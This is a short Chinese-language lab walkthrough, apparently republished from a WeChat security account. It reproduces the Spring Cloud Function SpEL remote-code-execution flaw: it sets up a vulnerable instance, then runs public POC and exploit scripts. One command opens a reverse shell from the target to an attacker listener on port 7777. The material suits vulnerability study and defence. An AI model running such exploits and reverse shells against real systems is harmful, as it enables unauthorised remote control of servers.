> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5wUCpYOZSad_C2KhO4dLtw)

  

**# 环境搭建**

JDK 15下载：

```
https://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icID4aZkJc14C5qGkkaPrLtqn6nqMGU0vdhiaVt8HIWNN6gMafia0lFfzBw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

在CentOS7上安装JDK 15环境

```
rpm -ivh jdk-15.0.2_linux-x64_bin.rpm
```

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icIK20VGE34qZiaeVBOPv2e0cibXHPmel0E5vbHicLKibwFn1IKHP9WkHvRJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

漏洞环境下载：

```
https://github.com/N1ce759/Spring-Cloud-Function-SPEL-RCE
```

部署漏洞环境：

```
java -jar SpringCloud-Function-0.0.1-SNAPSHOT.jar
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icIeJX7Cs3iaUDOdAoBJWPr9tyQD4qic9gln8CwxtNpicn897bv7V3EavcAg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

**# 漏洞复现**

访问：http://192.168.160.146:9000/

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icIrjibnNTL8uEPr450ice5ggibn1zbC51IlQcZfRWJkOISrpBdiaoiczZ7U2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

工具下载地址：  

```
https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE
```

开始检测漏洞并反弹shell

```
`## 检测漏洞``python3 Spel_RCE_POC.py url.txt``## 反弹shell``python3 Spel_RCE_Bash_EXP.py http://192.168.160.146:9000/ 192.168.160.241 7777`
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icI0DFyeCEHia6ZlOpwia1hWXWEBdLOibSO2aRDhIiazicvCR7q21Fj5HCVQLA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/R6upcsjVs6VZOmks3aQfjjBskwuAF0icI0YgUuwWI0MmexNFibdR26UtRFIYwDcoJib3nuv1taPGiaKsUg80UXuw0w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

PS：本公众号内的文章及工具仅提供学习用途，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及文章作者不为此承担任何责任。